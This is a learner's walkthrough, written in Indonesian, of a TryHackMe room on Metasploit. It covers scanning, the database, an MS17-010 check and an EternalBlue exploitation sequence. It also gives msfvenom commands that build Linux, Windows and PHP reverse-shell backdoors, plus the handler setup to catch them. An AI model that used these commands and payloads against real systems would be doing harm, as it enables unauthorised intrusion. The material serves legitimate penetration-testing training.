# Metasploit: Exploitation

---

- **Room Link:** [Metasploit: Exploitation](https://tryhackme.com/room/metasploitexploitation)
- **Category:** Exploitation Basics
- **Difficulty:** Easy

---

## Task 1: Introduction

Room ini adalah lanjutan dari *Metasploit: Introduction*. Di sini kita akan fokus pada penggunaan Metasploit untuk **scanning**, **vulnerability assessment**, dan **exploitation** yang sebenarnya.

Topik yang dibahas:
1.  Menggunakan modul scanning.
2.  Mengelola database Metasploit.
3.  Melakukan vulnerability scanning.
4.  Eksploitasi layanan yang rentan.
5.  Membuat payload dengan `msfvenom`.

---

## Task 2: Scanning

Metasploit memiliki kemampuan scanning yang hebat, baik menggunakan **Nmap** yang terintegrasi maupun modul **Auxiliary Scanner** bawaan.

**1. Port Scanning:**
Kita bisa menggunakan modul auxiliary untuk scanning port tanpa Nmap.
- Command: `search portscan`
- Contoh modul: `auxiliary/scanner/portscan/tcp`

**Cara Pakai:**
```bash
use auxiliary/scanner/portscan/tcp
set RHOSTS 10.10.10.10
set PORTS 1-1000
run
```

**2. UDP Scanning:**
Untuk scan UDP, gunakan modul `auxiliary/scanner/discovery/udp_sweep`.

---

## Task 3: The Metasploit Database

Salah satu fitur killerya Metasploit adalah database (PostgreSQL) untuk menyimpan hasil scan dan exploit.

**Perintah Penting:**
- `db_status`: Cek status koneksi database.
- `workspace`: Mengelola lembar kerja (proyek).
  - `workspace -a [nama]`: Buat workspace baru.
  - `workspace [nama]`: Pindah workspace.
- `db_nmap`: Menjalankan Nmap dan langsung simpan hasilnya ke database.
  - Contoh: `db_nmap -sV -p- 10.10.10.10`
- `hosts`: Melihat daftar host yang tersimpan.
- `services`: Melihat daftar service yang ditemukan (port terbuka).
- `vulns`: Melihat daftar vulnerability yang terdeteksi.

**Tips:** Menggunakan database memudahkan kita filter target, misal `services -p 80` untuk lihat semua host yang jalanin web server.
 
---

## Task 4: Vulnerability Scanning

Metasploit punya banyak modul scanner untuk cek kerentanan spesifik (bukan cuma port scanning).

**Contoh Kasus:**
Jika kita menemukan layanan SMB (port 445), kita bisa cek apakah rentan terhadap exploit tertentu (misal MS17-010).

1.  **Search Module:** `search type:auxiliary smb`
2.  **Pilih Scanner:** Misal `auxiliary/scanner/smb/smb_ms17_010`.
3.  **Run:** Set RHOSTS dan jalankan.

Hasil scan akan memberitahu apakah target *VULNERABLE* atau tidak.

---

## Task 5: Exploitation

Ini adalah inti dari Metasploit. Setelah scan dan nemu celah, kita eksploitasi!

**Langkah-langkah:**
1.  **Cari Exploit:** `search [nama_vuln]` (misal: `search eternalblue`).
2.  **Pilih Exploit:** `use exploit/windows/smb/ms17_010_eternalblue`.
3.  **Set Payload:** (Opsional, biasanya auto-set ke meterpreter). `set payload windows/x64/meterpreter/reverse_tcp`.
4.  **Konfigurasi:**
    - `set RHOSTS [Target IP]`
    - `set LHOST [IP VPN Kita]`
5.  **Eksekusi:** `exploit` atau `run`.

Jika berhasil, sesi Meterpreter akan terbuka!

**Pertanyaan:**
- **Answer:** ?

---

## Task 6: Msfvenom

Kadang exploit gak jalan langsung, atau kita butuh bikin file backdoor (trojan) manual. Di sinilah **Msfvenom** berperan. Msfvenom menggabungkan fungsi `msfpayload` dan `msfencode` dulu.

**Sintaks Dasar:**
```bash
msfvenom -p [payload] [options] -f [format] -o [output_file]
```

**Contoh Membuat Payload:**

1.  **Linux Reverse Shell (.elf):**
    ```bash
    msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.x.x LPORT=4444 -f elf -o shell.elf
    ```

2.  **Windows Reverse Shell (.exe):**
    ```bash
    msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.x.x LPORT=4444 -f exe -o shell.exe
    ```

3.  **PHP Reverse Shell (.php):**
    ```bash
    msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.x.x LPORT=4444 -f raw -o shell.php
    ```

**Handler (Wajib disiapkan di msfconsole):**
Supaya bisa nangkep koneksi dari payload di atas, kita harus set handler:
```bash
use exploit/multi/handler
set payload [payload_yg_sama]
set LHOST [IP_Kita]
set LPORT [Port_yg_sama]
exploit
```

---

## Task 7: Summary

Kita sudah belajar alur full penetration testing menggunakan Metasploit:
1.  **Recon/Scanning:** `db_nmap`, `auxiliary/scanner`.
2.  **Assessment:** Mencari celah keamanan.
3.  **Exploitation:** Masuk ke sistem (`use exploit/...`).
4.  **Payload Creation:** Bikin backdoor manual pake `msfvenom`.

Keep learning and happy hacking! üçª
